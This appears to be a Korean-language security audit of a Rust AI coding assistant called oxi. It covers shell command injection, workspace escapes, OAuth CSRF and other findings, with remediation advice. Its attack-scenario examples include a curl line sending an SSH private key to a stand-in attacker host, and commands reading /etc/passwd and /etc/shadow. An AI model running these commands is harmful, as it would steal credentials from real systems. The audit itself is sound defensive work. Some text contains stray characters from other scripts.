# oxi 보안 감사 보고서 (Security Audit Report)

**프로젝트:** oxi - Rust AI 코딩 어시스턴트
**감사일:** 2026-05-14
**감사 범위:** oxi-agent, oxi-store, oxi-ai, oxi-cli ( 전체 코드베이스 )

---

## 개요 (Executive Summary)

oxi 프로젝트는 Rust로 작성된 AI 코딩 어시스턴트로, 에이전트 루프, 다중 도구 실행, MCP 서버 통합, 확장을 지원한다. 전반적으로 보안 의식이 있는 설계가 이루어져 있으나, **명령어 주입, 작업 공간 경계 미검증, OAuth CSRF 등** 심각도가 높은 취약점이 발견되었다.

---

## 발견된 취약점 (Findings)

### 🔴 심각도: CRITICAL

#### 1. Bash 도구 - 명령어 주입 취약점
**위치:** `oxi-agent/src/tools/bash.rs:94-98`

```rust
let mut cmd = Command::new("sh");
cmd.arg("-c")
    .arg(command)  // 사용자 입력을 그대로 shell에 전달
```

**문제점:**
- 사용자(LLM)가 제공한 명령이 `sh -c`를 통해 직접 실행됨
- 命令 파라미터에 대한 탈출 또는 검증이 없음
- 세미콜론, 파이프, 환경 변수 주입 등이 모두 가능
- timeout 옵션은 존재하지만 명령어 자체는 검증되지 않음

**공격 시나리오:**
```json
{"command": "echo 'hello'; cat /etc/passwd"}
{"command": "echo $API_KEY"}
{"command": "curl http://attacker.com/?$(cat /root/.ssh/id_rsa)"}
```

**개선 필요사항:**
- 허용된 명령어 목록(whitelist) 구현
-危险한 패턴 감지 (semicolons, pipes, subshells, redirects)
- 작업 디렉토리 외부 접근 차단 (현재 cwd 검증은 있으나 명령어 내 경로 조작은 미검증)

---

#### 2. 작업 공간(Workspace) 경계 미검증
**위치:** `oxi-agent/src/tools/bash.rs`, `oxi-cli/src/extensions/wasm.rs`

**문제점:**
- `BashTool`은 작업 디렉토리(`cwd`)만 검증하고, 명령어 내出现的 경로는 검증하지 않음
- WASM 확장 `host_oxi_exec`는 `validate_path_allowed`를 사용하지 않음
- 파일 읽기/쓰기 도구는 `path.components().any(|c| c.as_os_str() == "..")` 검증을 하지만, bash는 심볼릭 링크 및 절대 경로를 통해 우회 가능

**예시:**
```json
{"command": "cat /home/user/.ssh/id_rsa", "cwd": "/tmp"}
{"command": "head -n 1 /etc/shadow"}
```

**개선 필요사항:**
- bash 명령어 내 경로 패턴 검출 및 차단
- realpath/canonicalize를 통한 심볼릭 링크 처리
- 작업 공간 외 파일 접근 시 거부

---

#### 3. OAuth CSRF 취약점 - state 파라미터 미검증
**위치:** `oxi-cli/src/oauth_server.rs:162-202`

```rust
fn parse_oauth_callback(request: &str) -> Option<OAuthCallbackData> {
    // ...
    let mut state = None;
    for pair in query.split('&') {
        let mut parts = pair.split('=');
        let key = parts.next()?;
        let value = parts.next()?.replace("%3D", "=").replace("%26", "&");
        
        match key {
            "code" => code = Some(value),
            "state" => state = Some(value),  // state 파라미터를 읽지만 검증 안함
            _ => {}
        }
    }
    // state 검증 로직 없음!
}
```

**문제점:**
- OAuth 콜백에서 `state` 파라미터를 읽지만, 원래 발급한 state와 비교하는 검증 로직이 없음
- CSRF 공격 시나리오: 공격자가 사용자를 유도하여 악성 콜백을 발생시킴
- 현재 `OAuthCallbackServer`에서 state를 수신만 하고 일치 여부를 확인하지 않음

**개선 필요사항:**
- 서버 시작 시 무작위 state 생성 및 세션 저장
- 콜백 수신 시 원래 state와 대조하여 일치 여부 검증
- 불일치 시 요청 거부 및 로깅

---

### 🟠 심각도: HIGH

#### 4. MCP 서버 설정 - 임의 명령 실행 허용
**위치:** `oxi-agent/src/mcp/config.rs:1-59`, `oxi-agent/src/mcp/client.rs`

**문제점:**
- MCP 서버 설정(JSON/YAML)에서 `command`, `args` 지정 가능
- 사용자 또는 프로젝트의 `.mcp.json` 파일에 정의된 서버가 실행됨
- 제한된 dangerous env 변수 목록 (`BLOCKED_ENV_VARS`) 있지만, 명령 자체는 검증 안함

```rust
const BLOCKED_ENV_VARS: &[&str] = &[
    "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES", "DYLD_LIBRARY_PATH"
];

// 위험한 환경 변수는 차단하지만 명령어 자체는 검증 안함
pub async fn connect(
    command: &str,
    args: &[String],
    env: &HashMap<String, String>,
    cwd: Option<&str>,
    debug: bool,
) -> Result<Self>
```

**개선 필요사항:**
- MCP 서버 명령어 허용 목록 구성 (config에서 지정)
- 신뢰할 수 없는 MCP 서버에 대한 경고 표시
- 네트워크 격리 또는 샌드박스 실행 고려

---

#### 5. 네이티브 확장 로딩 - 심볼릭 링크 공격
**위치:** `oxi-cli/src/extensions/loading.rs:1-180`

```rust
pub fn load_extension(path: &Path) -> anyhow::Result<Arc<dyn Extension>> {
    let library = unsafe { Library::new(path) }  // 경로 검증 없음
    // ...
    std::mem::forget(library);  // 메모리 leak로 라이브러리 활성 상태 유지
}
```

**문제점:**
- 확장 로딩 시 파일 무결성 검증 없음 (SHA256 체크섬은 `validate_extension`에서 계산하지만 사용 안함)
- 심볼릭 링크를 통해 악성 라이브러리 로딩 가능
- 라이브러리가 메모리에 영구 적재됨 (`std::mem::forget`)
- 확장 충돌 시 기존 확장 완전 제거 로직 없음

**개선 필요사항:**
- `validate_extension` 체크섬 사용 강제화
- 확장 서명/검증 메커니즘 구현
- 로딩 전 파일 유형 검증 강화

---

#### 6. 로깅 파일에 민감 정보 유출
**위치:** `oxi-cli/src/main.rs:31-32`

```rust
let log_file = std::fs::File::create(&log_path).expect("Failed to create log file");
```

**문제점:**
- 모든 로그가 `~/.cache/oxi/oxi.log`에 기록됨
- 기본 로그 레벨이 `debug`로 설정됨
- API 키, 토큰, 세션 정보가 로그에 포함될 수 있음

**로그 유출 시나리오:**
```
tracing::info!("Registered custom provider '{}' (openai-completions) -> {}", cp.name, cp.base_url);
// base_url에 API 키가 포함될 수 있음
```

**개선 필요사항:**
- `Secret<T>` 타입이 있는 만큼, 로깅 시 마스킹 강제화
- 로그 레벨 기본값을 `info`로 낮추기
- 민감 정보 패턴 자동 필터링 로깅 필터 구현

---

#### 7. WASM exec - 타임아웃 미강제
**위치:** `oxi-cli/src/extensions/wasm.rs:225-260`

```rust
struct ExecReq {
    command: String,
    timeout: u64,  // 필드는 있지만...
}
let output = match std::process::Command::new(&req.command)
    .output()  // 동기 실행 - timeout enforcement 없음
```

**문제점:**
- `timeout` 파라미터를 받지만 실제로 명령어 실행 시 강제되지 않음
- 동기 `Command::output()` 사용으로 비동기 타임아웃 불가
- 긴 실행 명령어에 대해 에이전트 전체가 차단됨

**개선 필요사항:**
- async 실행 및 진정한 타임아웃 enforcement
- 또는 동기 컨텍스트에서 `nohup` 사용 및 백그라운드 실행

---

### 🟡 심각도: MEDIUM

#### 8. unwrap() 호출 - 사용자 입력 처리 시 패닉 위험
**위치:** 다수 파일

```rust
// oxi-store/src/auth_storage.rs:413, 433
Ok(Some(content)) => serde_json::from_str(&content).unwrap_or_default(),

// oxi-agent/src/tools/edit.rs:48
serde_json::from_str::<Vec<EditEntry>>(s).unwrap_or_default()
```

**문제점:**
- 사용자 입력(파일 내용, JSON 파라미터)을 파싱할 때 `unwrap()` 사용
- 비정상 입력 시 panic 발생 가능 (서비스 거부가 아닌 crash)
- 테스트 코드 내의 `unwrap()`은 괜찮으나 프로덕션 경로의 것은 위험

**개선 필요사항:**
- `unwrap()` → `expect()` 또는 명시적 오류 처리로 교체
- 사용자 입력 파싱 시 `Result` 타입 사용
- 모든 외부 입력에 대한 검증 강화

---

#### 9. 파일 권한 - auth.json의 0600 설정 검증
**위치:** `oxi-store/src/auth_storage.rs:264-277`

```rust
#[cfg(unix)]
{
    use std::os::unix::fs::PermissionsExt;
    let perms = std::fs::Permissions::from_mode(0o600);
    std::fs::set_permissions(&self.path, perms)
        .map_err(|e| AuthError::WriteError(e.to_string()))?;
}
```

**양호한 점:**
- 파일 저장 시 0600 권한 설정 시도

**문제점:**
- Windows에서는 파일 권한 설정 안됨
- 상위 디렉토리 권한이 0755인지 확인 안함 (다른 사용자가 접근 가능)
- 설정 실패 시 경고만 하고 계속 진행 (오류 무시 가능)

**개선 필요사항:**
- Windows 환경에서 동등한 ACL/Mechanism 구현
- 상위 디렉토리 권한도 0700으로 제한
- 권한 설정 실패 시 fatal error로 처리

---

#### 10. TLS/인증서 검증 - 기본값 의존
**위치:** `oxi-agent/src/proxy.rs:248-251`

```rust
let client = reqwest::Client::builder()
    .timeout(Duration::from_secs(120))
    .build()?;  // 기본 TLS 설정 사용
```

**문제점:**
- TLS 인증서 검증 설정을 명시적으로 구성 안함
- 자체서명 인증서 환경에서 연결 실패 가능
- 프록시/HTTP_CLIENT 환경 변수의 암묵적 신뢰

**개선 필요사항:**
- TLS 구성 옵션 명시화 ( cert pinning 옵션 )
- 자체서명 인증서 환경에 대한 경고/대안 제공

---

#### 11. 프록시 인증 토큰 - 평문 전송
**위치:** `oxi-agent/src/proxy.rs:265-270`

```rust
let response = client
    .post(format!("{}/api/stream", proxy_url))
    .header("Authorization", format!("Bearer {}", auth_token))  // 평문 HTTP 가능
    .send()
    .await?;
```

**문제점:**
- HTTP 프록시 URL 사용 시 토큰이 평문으로 전송됨
- HTTPS 프록시더라도 Authorization 헤더가 프록시를 통과 시 복호화 가능
- 프록시 인증 정보도 안전하지 않음

**개선 필요사항:**
- HTTP URL 사용 시 경고 출력
- 가능하면 HTTPS 강제
- 토큰 순환/만료 정책 구현

---

#### 12. 역직렬화 - 신임할 수 없는 데이터
**위치:** 다수 파일

```rust
// oxi-store/src/session.rs:2132
match serde_json::from_str::<FileEntry>(&line) {
    Ok(entry) => { /* 사용 */ }
    Err(_) => { /* 무시 */ }
}

// oxi-store/src/auth_storage.rs:413
serde_json::from_str(&content).unwrap_or_default()
```

**양호한 점:**
- 많은 곳에서 `from_str` 결과에 대해 오류 처리가 되어 있음
- `unwrap_or_default()` 패턴으로 실패 시 안전하게 처리

**개선 필요사항:**
- 불특정 출처의 세션 파일도 신임할 수 없음 (공격자에 의한 변조 가능)
- 세션 파일 무결성 검증 (HMAC/서명) 고려
- 역직렬화 BOMB(Compressed bomb) 공격 가능성 - 바이트 제한 확인

---

### 🟢 심각도: LOW

#### 13. 확장 권한 - 선언만 있고 적용 안됨
**위치:** `oxi-cli/src/extensions/wasm.rs:33-38`, `oxi-cli/src/extensions/mod.rs`

```rust
pub struct ExtensionInfo {
    pub permissions: Vec<String>,  // 선언만 있고 실제로 미검증
}
```

**문제점:**
- 확장은 권한을 선언하지만 enforcement 없음
- `fs_write` 권한을 요청한 확장도 모든 경로에 쓰기 가능
- 권한 없는 확장도 네트워크/HTTP 요청 가능

**개선 필요사항:**
- 권한 enforcement 구현 (현재 Host 함수가 무조건 실행됨)
- 권한 없음 시 오류 반환

---

#### 14. 환경 변수 차단 - 불완전한 패턴
**위치:** `oxi-cli/src/extensions/wasm.rs:313-320`

```rust
let blocked_keys = ["AWS_SECRET", "PRIVATE_KEY", "PASSWORD", "TOKEN", "SECRET"];
let key_upper = req.key.to_uppercase();
for blocked in &blocked_keys {
    if key_upper.contains(blocked) {  // 대소문자 무시하지만 부분 일치
        anyhow::bail!("oxi_get_env: access to '{}' is blocked", req.key);
    }
}
```

**양호한 점:**
- 민감한 환경 변수에 대한 접근 차단

**문제점:**
- 차단 목록이 불완전 (다른 유명한 민감 변수 누락)
- 부분 문자열 일치로 실수 발생 가능 (`PASSWORD_HASH` → `PASSWORD` 감지)
- 정확히 일치하는 패턴이나 접두사 기반 차단이 더 좋음

---

#### 15. 세션 파일 권한
**위치:** `oxi-store/src/session.rs`

**문제점:**
- 세션 디렉토리 생성 시 권한이 명시되지 않음
- 세션 파일(`~/.oxi/sessions/*.jsonl`)의 권한이 기본값 (프로세스 umask 따라감)

**개선 필요사항:**
- 세션 디렉토리 0700权限 강제
- 세션 파일 0600权限 강제
- session_dir 설정 시 권한 검증

---

## 추가 발견 사항 (Additional Observations)

### 양호한 보안 관행 ✅

1. **Secret<T> 타입 활용** (`oxi-ai/src/secret.rs`)
   - Debug/Display에서 값 마스킹
   - API 키 등 민감 정보의 실수 유출 방지

2. **PathGuard 경로 검증** (`oxi-agent/src/tools/path_security.rs`)
   - canonicalize를 통한 심볼릭 링크 처리
   - 작업 공간 경계 검증

3. **MCP 환경 변수 차단** (`oxi-agent/src/mcp/client.rs`)
   - `LD_PRELOAD`, `LD_LIBRARY_PATH` 등 위험한 환경 변수 차단

4. **WASM SSRF 보호** (`oxi-cli/src/extensions/wasm.rs:422-450`)
   - localhost, private IP, cloud metadata 차단

5. **WASM 경로 보호** (`oxi-cli/src/extensions/wasm.rs:356-403`)
   - 시스템 디렉토리 (`/etc`, `/sys`, `/proc`, `/root/.ssh/` 등) 접근 차단

6. **File mutation queue** (`oxi-agent/src/tools/file_mutation_queue.rs`)
   - 파일 쓰기 직렬화 통해 레이스 컨디션 방지

7. **설정 파일 원자적 쓰기** (`oxi-store/src/settings.rs`)
   - temp 파일 사용 후 rename으로 원자적 저장

---

### 보안 개선 우선순위 (Remediation Priority)

| 우선순위 | 취약점 | 예상工作量 |
|---------|--------|----------|
| P0 | Bash 명령어 주입, Workspace 미검증 | 높음 |
| P0 | OAuth CSRF state 미검증 | 중간 |
| P1 | MCP 서버 임의 실행, 확장 로딩 | 중간 |
| P1 | 로깅 유출, WASM exec 타임아웃 | 낮음 |
| P2 | unwrap() 처리, TLS/권한 강화 | 중간 |
| P3 | 확장 권한 enforcement | 높음 |

---

## 권장 사항 (Recommendations)

1. **즉시 조치 (P0)**
   - bash 도구에 명령어 화이트리스트 또는危险 패턴 검출 구현
   - bash 실행 시 작업 공간 경계 검증 강제화
   - OAuth state 파라미터 검증 구현

2. **단기 개선 (P1)**
   - MCP 서버 신뢰도 표시 및 제한 옵션
   - 확장 무결성 검증 (체크섬强制)
   - 로그 민감 정보 필터링

3. **중기 개선 (P2)**
   - 모든 `unwrap()` 제거 및 명시적 오류 처리
   - 파일 권한 0600/0700 강제화
   - TLS 설정 명시화

4. **장기 개선 (P3)**
   - 확장 권한 시스템 완전한 enforcement
   - 세션 파일 무결성 검증 (HMAC 서명)
   - 보안 감사 자동화 (cargo-audit, فرکس 등 통합)

---

**감사 완료 보고서**